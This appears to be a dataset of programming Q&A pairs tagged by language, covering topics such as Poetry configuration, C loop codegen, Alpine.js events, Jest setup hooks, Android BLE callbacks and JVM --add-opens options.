Move the pyproject.toml file to the correct directory or
If you don't care about making your project packageable by Poetry and only use poetry as your package manager for this project, add package-mode = false to your pyproject.toml.

Explanation:
There's a thread on the official GitHub for Poetry that discusses this issue. The gist of the issue is that whatever you choose for your project name, i.e., name = ""myproject"", needs to be the direct parent directory of where your pyproject.toml file lives. When there is a mismatch, you get the error you are getting.
Sources:

Breakdown of the cause of the issue on thread on GitHub
A Poetry contributor's response on thread on GitHub

",python
do compilers produce better code for dowhile loops versus other types of loops,"There's a comment in the zlib compression library (which is used in the Chromium project among many others) which implies that a do-while loop in C generates ""better"" code on most compilers. Here is the snippet of code where it appears.
do {
} while (*(ushf*)(scan+=2) == *(ushf*)(match+=2) &&
         *(ushf*)(scan+=2) == *(ushf*)(match+=2) &&
         *(ushf*)(scan+=2) == *(ushf*)(match+=2) &&
         *(ushf*)(scan+=2) == *(ushf*)(match+=2) &&
         scan < strend);
/* The funny ""do {}"" generates better code on most compilers */

https://code.google.com/p/chromium/codesearch#chromium/src/third_party/zlib/deflate.c&l=1225
Is there any evidence that most (or any) compilers would generate better (e.g. more efficient) code?
Update: Mark Adler, one of the original authors, gave a bit of context in the comments.
","First of all:
A do-while loop is not the same as a while-loop or a for-loop.

while and for loops may not run the loop body at all.
A do-while loop always runs the loop body at least once - it skips the initial condition check.

So that's the logical difference. That said, not everyone strictly adheres to this. It is quite common for while or for loops to be used even when it is guaranteed that it will always loop at least once. (Especially in languages with foreach loops.)
So to avoid comparing apples and oranges, I'll proceed assuming that the loop will always run at least once. Furthermore, I won't mention for loops again since they are essentially while loops with a bit of syntax sugar for a loop counter.
So I'll be answering the question:
If a while loop is guaranteed to loop at least once, is there any performance gain from using a do-while loop instead.

A do-while skips the first condition check. So there is one less branch and one less condition to evaluate.
If the condition is expensive to check, and you know you're guaranteed to loop at least once, then a do-while loop could be faster.
And while this is considered a micro-optimization at best, it is one that the compiler can't always do: Specifically when the compiler is unable to prove that the loop will always enter at least once.

In other words, a while-loop:
while (condition){
    body
}

Is effectively the same as this:
if (condition){
    do{
        body
    }while (condition);
}

If you know that you will always loop at least once, that if-statement is extraneous.

Likewise at the assembly level, this is roughly how the different loops compile to:
do-while loop:
start:
    body
    test
    conditional jump to start

while-loop:
    test
    conditional jump to end
start:
    body
    test
    conditional jump to start
end:

Note that the condition has been duplicated. An alternate approach is:
    unconditional jump to end
start:
    body
end:
    test
    conditional jump to start

... which trades away the duplicate code for an additional jump.
Either way, it's still worse than a normal do-while loop.
That said, compilers can do what they want. And if they can prove that the loop always enters once, then it has done the work for you.

But things are bit weird for the particular example in the question because it has an empty loop body. Since there is no body, there's no logical difference between while and do-while.
FWIW, I tested this in Visual Studio 2012:

With the empty body, it does actually generate the same code for while and do-while. So that part is likely a remnant of the old days when compilers weren't as great.
But with a non-empty body, VS2012 manages to avoid duplication of the condition code, but still generates an extra conditional jump.

So it's ironic that while the example in the question highlights why a do-while loop could be faster in the general case, the example itself doesn't seem to give any benefit on a modern compiler.
Considering how old the comment was, we can only guess at why it would matter. It's very possible that the compilers at the time weren't capable of recognizing that the body was empty. (Or if they did, they didn't use the information.)
",c
google maps advancedmarker hover listener function not working,"I have created a function that places an array of pins on a map. I have already added a click function to all markers that re-centers the map on the new location and zooms to the appropriate. This part works without issue.
The mouseover event listener above it will not work & I can't figure out why. Is there something I'm overlooking?
function setMarker(loc,pos){
    pos = { lat: pos['lat'], lng: pos['lng'] }; 
    let marker = new AdvancedMarkerElement({
        map: map,
        position: pos,
        title: loc
    });

    google.maps.event.addListener(marker, 'mouseover', function() {
        console.log('Marker has been moused over.');
    });

    google.maps.event.addListener(marker, 'click', function() {
        map.panTo({ lat: jp[loc]['lat'], lng: jp[loc]['lng']} );
        animZoom(jp[loc]['zoom']);
        $location = loc;
    });
}

","I figured it out. After setting the marker, create an event listener targeting the marker.content object like so:
marker.content.addEventListener('mouseenter', function(){
    console.log('mouse enter');
});

marker.content.addEventListener('mouseleave', function(){
    console.log('mouse leave');
});

If you're wanting to add custom CSS for animation (e.g. hover effects, transitions, etc.), you can target the marker class itself without having to do it all manually via JavaScript:
.GMAMP-maps-pin-view { transition: all 0.25s linear; }
.GMAMP-maps-pin-view:hover { transform: scale(1.5); }

",javascript
node server running but localhost refusing to connect,"Trying to get the simplest node server interacting with the browser, with this: 
var http = require('http');


http.createServer(function(req, res){

  res.writeHead( 200, { ""content-Type"" : 'text/plain' } )
  res.send('Hello world');

}).listen(1337, '192.168.1.2');

but localhost won't do it..
localhost refused to connect

Thats the IPv4 address. Am I missing something here? 
","I suspect you are on a Mac. First change 192.168.1.2 to 127.0.0.1, or 0.0.0.0 if you want to be accessible from other computers.
Next browse to http://127.0.0.1:1337/, not http://localhost:1337/. For whatever reason localhost resolves to ::1 - an IPv6 address on my Mac. For some reason Node immediately disconnects any IPv6 connections on my machine.
",javascript
writing a c program to only run on a single processor core,"How can I force an application I'm writing to only use a single processor core?
","There is a Linux system call specifically for this purpose called sched_setaffinity
For example, to run on CPU 0:
#include <sched.h>
int main(void)
{
    cpu_set_t  mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    result = sched_setaffinity(0, sizeof(mask), &mask);
    return 0;
}

",c
beforeall vs beforeeach when to use them,"I was recently looking over a co-workers code and I realized that he implements a jest function in a BeforeAll function at the top of the describe call, and then creates a data object in a beforeEach function.  This made me wonder, what exactly are the differences between BeforeAll and BeforeEach.
It was time... I went to Google!!  I did find some articles that helped shed some light on some of the functionality differences between the two.
Findings 1: http://breazeal.com/blog/jasmineBefore.html
Findings 2: Difference between @Before, @BeforeClass, @BeforeEach and @BeforeAll
Given the articles I found that BeforeAll is called once and only once.  While the BeforeEach is called before each individual test.  Which was great!  I now had a better idea of when it was being called!  
I also found out that the BeforeAll is best used for initializing code. Which makes perfect sense!  Initialize it once.  Boom, you're done.
My confusion I am having is when is something initialized and when is it not?  I have found that BeforeEach in our code is used more often than not.  What I am curious about is what kind of code is considered to be ""initializing"" code, vs whatever code should be in the BeforeEach.
An example from our code below:
    beforeAll((done) => {
      // Mocking method from within Box file
      transferBoxPlanSpy = jest.spyOn(Box, 'transferPlanFromBox').mockImplementation(() => Promise.resolve());

      // Pulling data from MongoDB
      User.findOne({ user_name: 'testsurgeon1' }, (err, user) => {
        user.addMGSPermission();
        user.save(done);
      });
    });

    beforeEach(() => {
      planData2 = {
        user_name: 'hello1',
        laterality: 'right',
        plan_id: 'testplan42',
        order_number: '856-hd-02-l',
        file_id: '123456sbyuidbefui',
      };
    });

I hope my question isn't too vague.  Thank you for your time!
Edit 1
I would like to point out that this code was not made by myself, but from one of our members on the software team.  He puts the object inside of the BeforeEach, and the mocks inside of the BeforeAll.  
My confusion is that it seems like all code can be put just into BeforeAll, with a few exceptions.
","Both are used to set up whatever conditions are needed for one or more tests.
If you're certain that the tests don't make any changes to those conditions, you can use beforeAll (which will run once).
If the tests do make changes to those conditions, then you would need to use beforeEach, which will run before every test, so it can reset the conditions for the next one.
Unless the initialization is slow or computationally expensive, it may be safest to default to using beforeEach as it reduces the opportunity for human error, i.e. not realizing that one test is changing the setup for the next one.   (Asynchronous network calls are a common -- though of course not the only -- use case for ""slow"" initialization where beforeAll is appropriate.)
The sample you showed is a good example of using both in combination -- the slow network call is put in beforeAll, so it only has to happen once; and the data object (which is presumably modified by the tests) is reset each time in beforeEach.
",javascript
how to postponedefer the evaluation of fstrings,"I am using template strings to generate some files and I love the conciseness of the new f-strings for this purpose, for reducing my previous template code from something like this:
template_a = ""The current name is {name}""
names = [""foo"", ""bar""]
for name in names:
    print (template_a.format(**locals()))

Now I can do this, directly replacing variables:
names = [""foo"", ""bar""]
for name in names:
    print (f""The current name is {name}"")

However, sometimes it makes sense to have the template defined elsewhere — higher up in the code, or imported from a file or something. This means the template is a static string with formatting tags in it. Something would have to happen to the string to tell the interpreter to interpret the string as a new f-string, but I don't know if there is such a thing.
Is there any way to bring in a string and have it interpreted as an f-string to avoid using the .format(**locals()) call?
Ideally I want to be able to code like this... (where magic_fstring_function is where the part I don't understand comes in):
template_a = f""The current name is {name}""
# OR [Ideal2] template_a = magic_fstring_function(open('template.txt').read())
names = [""foo"", ""bar""]
for name in names:
    print (template_a)

...with this desired output (without reading the file twice):
The current name is foo
The current name is bar

...but the actual output I get is:
The current name is {name}
The current name is {name}


See also: How can I use f-string with a variable, not with a string literal? 
","Here's a complete ""Ideal 2"".
It's not an f-string—it doesn't even use f-strings—but it does as requested. Syntax exactly as specified. No security headaches since we are not using eval().
It uses a little class and implements __str__ which is automatically called by print. To escape the limited scope of the class we use the inspect module to hop one frame up and see the variables the caller has access to.
import inspect

class magic_fstring_function:
    def __init__(self, payload):
        self.payload = payload
    def __str__(self):
        vars = inspect.currentframe().f_back.f_globals.copy()
        vars.update(inspect.currentframe().f_back.f_locals)
        return self.payload.format(**vars)

template = ""The current name is {name}""

template_a = magic_fstring_function(template)

# use it inside a function to demonstrate it gets the scoping right
def new_scope():
    names = [""foo"", ""bar""]
    for name in names:
        print(template_a)

new_scope()
# The current name is foo
# The current name is bar

",python
fatalgpu_data_manager_impl_privatecc439 gpu process isn39t usable goodbye,"I am working on Ubuntu 18.04 and getting the following exception in latest version of intellij FATAL:gpu_data_manager_impl_private.cc(439)] GPU process isn't usable. Goodbye. error. This is occuring on both Ultimate and Community versions when I am opening any remote repository although new helloworld project works fine for me. I can clone the repo successfully but intellij crashes with this exception
I have also tried running intellij with --disable-gpu but didn't work for me.
","disable Markdown plugin.
it's work for me.
",java
concatenating command line arguments into a single string,"I am currently tying to make a function that put all the command lines arguments into a single string while separating them with a '\n'. My current code does work fine but with the only problem being a '\n' it add after the last command line argument.
Here is my current code:
char *concat_parameters(int ac, char **av)
{
    int i = 0;
    int length = 0;
    char *str;

    for (i = 0; i != ac; ++i){
        length = length + my_strlen(av[i]) + 1;
    }
    str = (char *) malloc(sizeof(char) * length);
    for (i = 0; i != ac; ++i){
        if (i == (ac - 1)){
            concat_strings(str, av[i]);
            break;
        } else {
            concat_strings(str, av[i]);
            concat_strings(str, ""\n"");
        }
    }
    return str;
}

","Assuming that your functions my_strlen and concat_strings behave exactly the same way as the functions strlen and strcat from the C standard library, your program has a more serious problem than the undesired newline character.
The function strcat works by first finding the end of the destination string (which is marked with a null character) and then appending the source string to the destination string. This means that strcat should not be used on a memory buffer that contains uninitialized data, because unless the first character happens to be a null character, you will get uninitialized data in your string, or your program may crash due to strcat overflowing the buffer while trying to find the null character.
One way to solve this is to use strcpy instead of strcat the first time you write to the destination string. The function strcpy will simply overwrite the destination string and will not search for a null character. However, this solution would be cumbersome in this case, because you wouldn't be able to consistently use strcat.
A simpler solution would be to mark the destination string as empty, by explicitly writing a null character to the first character of the destination string. That way, you can use strcat on it immediately afterwards and won't need strcpy. You can consistently use strcat on the destination string.
In order to do this, you can add the following line before the loop:
str[0] = '\0';

If you want the last line to not have a newline character at the end, then one thing you can do is to add the newline character in the next loop iteration instead of the current one, before adding the next string. This means that all loop iterations except the first one should add the newline character. You can accomplish this with the following code:
for ( i = 0; i != ac; i++ )
{
    // add a newline character unless we are in the first iteration
    if ( i != 0 )
    {
        strcat( str, ""\n"" );
    }

    // concatenate new string too existing string
    strcat( str, av[i] );
}

A more efficient, but less readable solution is to use an infinite loop and to move the loop condition inside the loop:
for ( i = 0; ; )
{
    // add new string to existing string
    strcat( str, av[i] );

    // break out of infinite loop if loop termination condition
    // is reached
    if ( ++i == ac )
    {
        break;
    }

    // add newline character
    strcat( str, ""\n"" );
}

That way, you only have to perform one comparison instead of two comparisons per loop iteration.
Note however that calling strcat in a loop is highly inefficient, because every time you call strcat, that function must scan the entire string to find the end of the string. This is known as Shlemiel the painter’s algorithm, and this algorithm has a time complexity of O(n^2). If you only have a few loop iterations and the strings are short, then this probably won't be a problem. But if you have many loop iterations and large strings, then this could be a serious problem.
Therefore, it would be more efficient not to use strcat at all, but to instead keep track of the end of the destination string yourself, and to write data to the end using memcpy, for example like this:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *concat_parameters( int ac, char **av )
{
    int length = 0;

    // count total length of strings
    for ( int i = 0; i < ac; i++ )
    {
        length = length + strlen( av[i] ) + 1;
    }

    // allocate memory for destination string
    char *str = malloc( length );

    // add variable to keep track of the end of the
    // destination string
    char *end = &str[0];

    for ( int i = 0; ; )
    {
        // calculate length of string to be appended
        length = strlen( av[i] );

        // add new string to existing string
        memcpy( end, av[i], length );

        // update pointer to point to new end
        end += length;

        // break out of infinite loop if loop termination condition
        // is reached
        if ( ++i == ac )
        {
            break;
        }

        // add newline character
        *end++ = '\n';
    }

    //  write null character to the end of the destination string
    *end = '\0';

    return str;
}

int main()
{
    char *test[] = { ""Apples"", ""Bananas"", ""Oranges"" };
    char *result = concat_parameters( sizeof test / sizeof *test, test );
    printf( ""%s\n"", result );
    free( result );
}

This program has the following output:
Apples
Bananas
Oranges

",c
android ble ondescriptorwrite oncharacteristicwrite oncharacteristicread none are being called but other callbacks work,"I am writing an Android client that connects to a custom BLE server (peripheral) using a custom service and characteristics.  I have verified that I can communicate with the device using the Android app BLE Scanner, and have also verified that I have correct UUIDs for the various characteristics.  I have written code to write to the write-only characteristic, and the onCharacteristicWrite callback is never called.  I have also written code to enable notifications on the read/notify characteristic, including updating the CCC descriptor to indicate notifications enabled, but neither the onDescriptorWrite, onCharacteristicWrite nor onCharacteristicChanged callback is called.  I know that the BluetoothGattCallback is properly registered, because I do get calls to onConnectionStateChanged and onServicesDiscovered.
This code enables notifications on a given characteristic:
    public void setCharacteristicNotification(BluetoothGattCharacteristic characteristic,
                                          boolean enabled) {
    if (mBluetoothAdapter == null || mBluetoothGatt == null) {
        Log.w(CLASS_NAME, ""BluetoothAdapter not initialized"");
        return;
    }
    // Check if this characteristic actually has NOTIFY property
    if((characteristic.getProperties() & BluetoothGattCharacteristic.PROPERTY_NOTIFY) == 0 ) {
        Log.e(CLASS_NAME, ""Characteristic does not support notifications"");
        return;
    }
    mBluetoothGatt.setCharacteristicNotification(characteristic, enabled);

    // For characteristics that support it, write to the CCC descriptor
    // that notifications are enabled.
    if (enabled) {
        if (TX_PERIPHERAL_TO_CENTRAL.equals(characteristic.getUuid())) {
            BluetoothGattDescriptor descriptor = characteristic.getDescriptor(
                    UUID.fromString(GattAttributes.TX_PERIPHERAL_TO_CENTRAL_CCC));
            descriptor.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);
            if (!mBluetoothGatt.writeDescriptor(descriptor)) {
                Log.d(CLASS_NAME, ""Write to descriptor failed: ""+TX_PERIPHERAL_TO_CENTRAL_CCC);
            }
        }
    }
}

I can see in the logs that this gets called and that the writeDescriptor() call succeeds.  However, onDescriptorWrite is never called, neither is onCharacteristicChanged.
Here is the code for the callbacks:
        @Override
    public void onCharacteristicChanged(BluetoothGatt gatt,
                                        BluetoothGattCharacteristic characteristic) {
        Log.d(CLASS_NAME, ""in onCharacteristicChange() characteristic = ""+characteristic.getUuid());
        broadcastUpdate(ACTION_DATA_AVAILABLE, characteristic);
    }

    @Override
    public void onDescriptorWrite(BluetoothGatt gatt, BluetoothGattDescriptor descriptor, int status) {
        super.onDescriptorWrite(gatt, descriptor, status);
        Log.d(CLASS_NAME, ""in onDescriptorWrite() status = ""+status+"", descriptor = ""+descriptor.getUuid());
        Log.d(CLASS_NAME, ""  descriptor value = ""+descriptor.getValue());
    }

As you can see, I should be seeing something in the logs if either of these were called.
There's a similar issue with characteristic writes.  Here is the code that performs a write, but onCharacteristicWrite is never called after this:
    public boolean writeCharacteristic(BluetoothGattCharacteristic characteristic, String data) {
    boolean result = false;
    if (mBluetoothAdapter == null || mBluetoothGatt == null) {
        Log.w(CLASS_NAME, ""BluetoothAdapter not initialized"");
        return false;
    }
    // Check if this characteristic actually has WRITE property
    if((characteristic.getProperties() & BluetoothGattCharacteristic.PROPERTY_WRITE) == 0 ) {
        Log.e(CLASS_NAME, ""Characteristic is not writeable"");
        return false;
    }
    byte[] ascii = data.getBytes(StandardCharsets.US_ASCII);
    if (characteristic.setValue(ascii)) {
        result = mBluetoothGatt.writeCharacteristic(characteristic);
    }
    return result;
}

In this case, writeCharacteristic() always returns false, despite the fact that I check to make sure it's a writable characteristic.
I have also used BLE Scanner to make sure that the characteristics I'm using can successfully be written to and read using notifications, so whatever the problem is, it's on my end.  And apologies for the messy code - it's definitely in an incomplete state.
","I've managed to figure this out on my own.  The reason the attempts to write and turn on notifications were failing is the way in which I was managing the BluetoothGattCharacteristic objects.  Using sample code I had found online, I was caching all of the BluetoothGattCharacteristic objects that are returned from BluetoothGatt.getServices().  I was then fetching each BluetoothGattCharacteristic from the cache and using it to make calls to operations such as BluetoothGatt.writeCharacteristic() or BluetoothGatt.setCharacteristicNotification().  Apparently, this is not the correct approach.
I have since modified my code so that I fetch a fresh copy of the service and characteristic object from BluetoothGatt before making any of the calls that were failing, using the method shown here:
/**
 * Fetches a characteristic from the GATT server.
 * @param serviceUUID unique id of the service that has the characteristic
 * @param characteristicUUID unique id of the characteristic
 * @return the requested characteristic, or null
 */
private BluetoothGattCharacteristic getCharacteristic(UUID serviceUUID, UUID characteristicUUID) {
    if (characteristicUUID == null) {
        Log.e(CLASS_NAME, ""Attempt to fetch characteristic using null characteristic UUID"");
        return null;
    }
    if (serviceUUID == null) {
        Log.e(CLASS_NAME, ""Attempt to fetch characteristic ""+characteristicUUID+"" using null service UUID"");
        return null;
    }
    BluetoothGattCharacteristic characteristic = null;
    BluetoothGattService service = mBluetoothGatt.getService(serviceUUID);
    if (service != null) {
        characteristic = service.getCharacteristic(characteristicUUID);
        if (characteristic == null) {
            Log.d(CLASS_NAME, ""getCharacteristic(): Unable to obtain characteristic."");
        }
    }
    else {
        Log.d(CLASS_NAME, ""getCharacteristic(): Unable to obtain service."");
    }

    return characteristic;
}

With this, I now get the expected callbacks to onCharacteristicWrite, onCharacteristicChange, onDescriptorWrite, etc.  I hope this is helpful to someone in the future.
",java
update table row with async fetch using alpinejs,"Each table row has a cell with some ""expensive"" data loaded on demand; before it is loaded, it shows ""?"". When that row's button is clicked, the cell is populated.
<table>
  <tbody>

    <!-- rows 1..10  -->

    <tr x-data=""{ foo: '?' }"">
      <td><span x-text=""foo""></span></td>
      <!-- ... -->
      <td><button onclick=""foo = await fetchFoo('row-11')"">Load</button></td>
    </tr>

    <!-- rows 12... -->

  </tbody>
</table>

<script>
  async function fetchFoo(rowId) {
    let url      = `https://www.example.com/foo/${rowId}`;
    let response = await fetch(url);
    let result   = await response.text();
    return result;
  }
</script>

How do I pass the fetched data from the button to the cell?
UPDATE
Here's a demo showing it doesn't work; I tried various syntaxes:


<script src=""https://cdn.jsdelivr.net/npm/alpinejs@3.14.8/dist/cdn.min.js"" defer></script>

<table>
  <tbody>
    <tr x-data=""{ foo: '?' }"">
      <td>Hello</td>
      <td><span x-text=""foo""></span></td>
      <td><button onclick=""foo = await fetchFoo('row-1')"">Load</button></td>
    </tr>
    <tr x-data=""{ foo: '?' }"">
      <td>World</td>
      <td><span x-text=""foo""></span></td>
      <td><button onclick=""async () => { foo = await fetchFoo('row-2') }"">Load</button></td>
    </tr>
    <tr x-data=""{ foo: '?' }"">
      <td>Hi</td>
      <td><span x-text=""foo""></span></td>
      <td><button onclick=""fetchFoo('row-3')"">Load</button></td>
    </tr>
    <!-- rows 4+... -->
  </tbody>
</table>

<script>
  async function fetchFoo(rowIndex) {
    return new Promise(resolve => setTimeout(() => resolve(rowIndex), 1000));
  }
</script>



","You must change the onclick to x-on:click:


<script src=""https://cdn.jsdelivr.net/npm/alpinejs@3.14.8/dist/cdn.min.js"" defer></script>

<table>
  <tbody>
    <tr x-data=""{ foo1: '?' }"">
      <td>Hello</td>
      <td><span x-text=""foo1""></span></td>
      <td><button x-on:click=""foo1 = await fetchFoo('row-1')"">Load</button></td>
    </tr>
    <!-- rows 4+... -->
  </tbody>
</table>

<script>
  async function fetchFoo(rowIndex) {
    return new Promise(resolve => setTimeout(() => resolve(rowIndex), 1000));
  }
</script>



UPDATE:
by using ""onclick"" you're using basic js directives, you must use x-on:click to use alpine's directives.
",javascript
how to read compiler flags from a file,"Is it possible to configure clang to read the compiler flags from a file. Is there any flag like:
 clang++ test.cpp -flags=flags-file

Such that clang reads the compiler flags from flags-file.
","Apparently there is support for reading commands from a file in clang as well as in gcc. The usage is something like:
clang++ test.cpp @file

The compiler will read the command line flags from file.
I could find a link for gcc. 
https://developer.apple.com/library/mac/documentation/darwin/reference/manpages/man1/gcc.1.html
",c
is there a nonreentrant readwritelock i can use,"I need a ReadWriteLock that is NOT reentrant, because the lock may be released by a different thread than the one that acquired it. (I realized this when I started to get IllegalMonitorStateException intermittently.)
I'm not sure if non-reentrant is the right term. A ReentrantLock allows the thread that currently holds to lock to acquire it again. I do NOT want this behaviour, therefore I'm calling it ""non-reentrant"". 
The context is that I have a socket server using a thread pool. There is NOT a thread per connection. Requests may get handled by different threads. A client connection may need to lock in one request and unlock in another request. Since the requests may be handled by different threads, I need to be able to lock and unlock in different threads.
Assume for the sake of this question that I need to stay with this configuration and that I do really need to lock and unlock in different requests and therefore possibly different threads.
It's a ReadWriteLock because I need to allow multiple ""readers"" OR an exclusive ""writer"".
It looks like this could be written using AbstractQueuedSynchronizer but I'm afraid if I write it myself I'll make some subtle mistake. I can find various examples of using AbstractQueuedSynchronizer but not a ReadWriteLock.
I could take the OpenJDK ReentrantReadWriteLock source and try to remove the reentrant part but again I'm afraid I wouldn't get it quite right.
I've looked in Guava and Apache Commons but didn't find anything suitable. Apache Commons has RWLockManager which might do what I need but I'm not sure and it seems more complex than I need.
","A Semaphore allows different threads to perform the acquire and release of permits. An exclusive write is equivalent to having all of the permits, as the thread waits until all have been released and no additional permits can be acquired by other threads.
final int PERMITS = Integer.MAX_VALUE;
Semaphore semaphore = new Semaphore(PERMITS);

// read
semaphore.acquire(1);
try { ... }
finally {
  semaphore.release(1);
}

// write
semaphore.acquire(PERMITS);
try { ... }
finally {
  semaphore.release(PERMITS);
}

",java
difftime return different data type in c on vs2022,"I found a weird thing in my program. Here are two examples
#include <stdio.h>

int main() {

    time_t t1, t2;
    t1 = 1735689614;
    t2 = 1735689600;

    printf(""difftime =%d \n"", difftime(t1, t2)); // difftime() return int
}

#include <stdio.h>
#include <time.h>

int main() {

    time_t t1, t2;
    t1 = 1735689614.0;
    t2 = 1735689600.0;

    printf(""difftime =%f \n"", difftime(t1, t2)); // difftime() return double 
}

you may notice that #include<time.h> and the return value of difftime()
The difftime() of two examples are different functions.
I know the double difftime() is the standard function of time.h (C11). But where the int difftime() come from?
It is a very weird and subtle problem when c programming in vs2022. I have change the c standard to C11 in vs2022. And The program compiled OK. I thought it would use the double difftime() without #inlcude<time.h>.
While this problem can be clearly seen when using gcc
implicit declaration of function 'difftime' [-Wimplicit-function-declaration]

double difftime()

int difftime()

","In the first version, you don't include <time.h>, and therefore difftime is implicitly declared as returning int whereas it actually returns a double.
BTW the compiler warns you with this message: warning C4013: 'difftime' undefined; assuming extern returning int.
So basically the first version of your code is broken.
Consider all warnings containing the words ""undefined"" and ""assuming"" as errors.
",c
unrecognized option addopens when passed with _java_options,"I am trying to fix the issue with running Nexus IQ scanner using Java 17 runtime.
The error is

java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not ""opens java.lang"" to unnamed module @7225790e

So I try to pass --add-opens java.base/java.lang=ALL-UNNAMED fix to the JVM which runs nexus-iq-cli.jar.
Unfortunately, I do not have a full control over java -jar ... command which gets executed on CI, otherwise I would just pass --add-opens java.base/java.lang=ALL-UNNAMED explicitly. Because of that limitation I try to use some other ways to set global JVM argument settings. One way to do it which came to my mind is using _JAVA_OPTIONS environment variable.
The thing which surprises me is that Java quits with an error:

Unrecognized option: --add-opens

When I try to pass it as follows:
# with unix shell you can set value to some variable and execute something in one line
_JAVA_OPTIONS='--add-opens java.base/java.lang=ALL-UNNAMED' java

On the other hand, Java is totally fine and acts as expected when I pass this option directly as:
java --add-opens java.base/java.lang=ALL-UNNAMED

What am I missing and what are the other possible ways to pass --add-opens java.base/java.lang=ALL-UNNAMED argument if I do not have a direct control over the java -jar command which CI executes to perform Nexus IQ scan step?
","It turned out that since Java 9 the modern proper way to achieve what I want is using the JDK_JAVA_OPTIONS environment variable.
_JAVA_OPTIONS was an undocumented feature
Here is an excerpt from JDK 9 release notes:

JDK 9 supports a new environment variable JDK_JAVA_OPTIONS to prepend options to those specified on the command line. The new environment variable has several advantages over the legacy/unsupported _JAVA_OPTIONS environment variable including the ability to include java launcher options and @file support

My final solution to Nexus IQ issue was to add the following 2 options for JVM:
--add-opens java.base/java.lang=ALL-UNNAMED
--add-opens=java.base/java.util=ALL-UNNAMED

If you face InaccessibleObjectException on some other package, just add one more --add-opens
",java
how do i chopslicetrim off last character in string using javascript,"I have a string, 12345.00, and I would like it to return 12345.0.
I have looked at trim, but it looks like it is only trimming whitespace and slice which I don't see how this would work. Any suggestions?
","You can use the substring function:


let str = ""12345.00"";
str = str.substring(0, str.length - 1);
console.log(str);



This is the accepted answer, but as per the conversations below, the slice syntax is much clearer:


let str = ""12345.00"";
str = str.slice(0, -1); 
console.log(str);



Neither method mutates
",javascript
catching errors from async function in trycatch block outside of async function,"So I'm doing a tutorial which contains a part about asynchronous JavaScript. I feel like I have it down pretty good, but it includes this section which I feel like is wrong for catching errors?
    async function myFunction {
      // ...
      await someObject.methodThatReturnsPromise();
      // ...
      await aFunctionThatReturnsPromise();
      // ...
    }
    
    try {
      // ...
      myFunction();
      // ...
    } catch (e) {
     // error handling code
    }

This is the explanation it gives.

You can see how this works in the example below. myFunction() is an
asynchronous function that is called within a try...catch block. When
myFunction() is run, code execution is paused at
methodThatReturnsPromise() until the promise resolves, at which point
the code continues to aFunctionThatReturnsPromise() and waits again.
The code in the catch block runs if an error is thrown in the
asynchronous function, and this will happen if the promise returned by
either of the methods is rejected.

My understanding is this is all incorrect? To catch errors, either put the try...catch block inside myFunction(), or catch the errors the when calling myFunction() in the global context with
myFunction().catch((error) => console.log(error));

","You are correct regarding the code and quoted ""explanation"":

The await operator will throw with the rejection reason if a promise it is waiting on becomes rejected.

An async function will reject the promise it returns when called if an uncaught exception is thrown when executing its function body.


",javascript
redundantbetter performance code vs optimizedless performance code,"In my case, I'm using C#, but the concept of the question would apply to Java as well. Hopefully the answer would be generic enough to cover both languages. Otherwise it's better to split the question into two.
I've always thought of which one is a better practice.
Does the compiler take care of enhancing the 'second' code so its performance would be as good as the 'first' code?
Could it be worked around to get a 'better performance' and 'optimized' code at the same time?
Redundant/Better Performance Code:
string name = GetName(); // returned string could be empty
List<string> myListOfStrings = GetListOfStrings();
if(string.IsNullOrWhiteSpace(name)
{
    foreach(string s in myListOfStrings)
        Console.WriteLine(s);
}
else
{
    foreach(string s in myListOfStrings)
        Console.WriteLine(s + "" (Name is: "" + name);
}

Optimized/Less Performance Code:
string name = GetName(); // returned string could be empty
List<string> myListOfStrings = GetListOfStrings();

foreach(string s in myListOfStrings)
    Console.WriteLine(string.IsNullOrWhiteSpace(name) ? s : s + "" (Name is: "" + name);

Obviously the execution time of the 'first' code is less because it executes the condition 'string.IsNullOrWhiteSpace(name)' only once per loop. Whereas the 'second' code (which is nicer) executes the condition on every iteration.
Please consider a long loop execution time not a short one because I know that when it is short, the performance won't differ.
","
Does the compiler take care of enhancing the 'second' code so its performance would be as good as the 'first' code?

No, it cannot.

It doesn't know that the boolean expression will not change between iterations of the loop.  It's possible for the code to not return the same value each time, so it is forced to perform the check in each iteration.
It's also possible that the boolean expression could have side effects.  In this case it doesn't, but there's no way for the compiler to know that.  It's important that such side effects would be performed in order to meet the specs, so it needs to execute the check in each iteration.

So, the next question you need to ask is, in a case such as this, is it important to perform the optimization that you've mentioned?  In any situation I can imagine for the exact code you showed, probably not.  The check is simply going to be so fast that it's almost certainly not going to be a bottleneck.  If there are performance problems there are almost certainly bigger fish.
That said, with only a few changes to the example it can be made to matter.  If the boolean expression itself is computationally expensive (i.e. it is the result of a database call, a web service call, some expensive CPU computation, etc.) then it could be a performance optimization that matters.  Another case to consider is what would happen if the boolean expression had side effects.  What if it was a MoveNext call on an IEnumerator?  If it was important that it only be executed exactly once because you don't want the side effects to happen N times then that makes this a very important issue.
There are several possible solutions in such a case.
The easiest is most likely to just compute the boolean expression once and then store it in a variable:
bool someValue = ComputeComplexBooleanValue();
foreach(var item in collection)
{
    if(someValue)
        doStuff(item);
    else
        doOtherStuff(item);
}

If you want to execute the boolean value 0-1 times (i.e. avoid calling it even once in the event that the collection is empty) then we can use Lazy to lazily compute the value, but ensure it's still only computed at most one time:
var someValue = new Lazy<bool>(() => ComputeComplexBooleanValue());
foreach (var item in collection)
{
    if (someValue.Value)
        doStuff(item);
    else
        doOtherStuff(item);
}

",java
how to add a new button to the main menu bar using magicdraw openapi,"I am working with the MagicDraw OpenAPI and would like to add a new button named ""TEST"" to the main menu bar of MagicDraw, to the right of ""Help"" button (see image below, I want the button at the red circle).

Here are useful resources

online doc
javadoc

Here is my current code example, when I run the codes, the button I want doesn't appear at all:
public class Main extends Plugin{   
    public void init()
    {
        initialized = true;
        NMAction action = new MyAction(""test"", ""TEST"");
        MainMenuConfiguration configurator = new MainMenuConfiguration((MyAction) action);
        ActionsConfiguratorsManager.getInstance().addMainMenuConfigurator(configurator);
    } 
    }
public class MainMenuConfiguration implements AMConfigurator {
    public void configure(ActionsManager actionsManager) {
        ActionsCategory newCategory = new ActionsCategory(""idTest"", ""TEST"");
        ActionsManager newManager = new ActionsManager();
        newManager.addCategory(newCategory);

    }
}

","Problem solved by creating a class
